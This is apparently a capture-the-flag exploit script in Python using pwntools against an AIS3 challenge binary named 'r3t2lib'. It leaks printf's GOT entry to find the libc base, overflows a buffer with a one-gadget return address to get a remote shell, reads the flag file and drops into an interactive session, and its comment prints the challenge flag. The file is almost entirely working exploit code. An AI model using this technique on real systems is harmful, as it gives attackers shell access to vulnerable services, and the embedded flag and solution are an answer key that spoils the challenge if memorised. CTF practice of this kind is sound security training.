#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{ret_2_lib_1s_v3ry_coMm0n_in_r34l_w0rld}

e = ELF('r3t2lib')
l = ELF('libc.so.6')

context.arch = 'amd64'

host , port = 'pwnhub.tw' , 8088
#host , port = '192.168.78.141' , 4000
y = remote( host , port )

main = 0x4006f6

y.sendafter( ':' , hex( e.got['printf'] ) )
y.recvuntil(':')
ad = int( y.recvline().strip()[2:] , 16 )

log.success( 'printf ofs -> {}'.format( hex( ad ) ) )

l.address +=  ad - l.symbols['printf']

log.critical( 'Libc base -> {}'.format( hex( l.address ) ) )

p = 'D' * 0x110
p += 'RBBBBBBP'
p += flat(
    l.address + 0xf0567,
)


sleep(2)

y.sendline( p )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

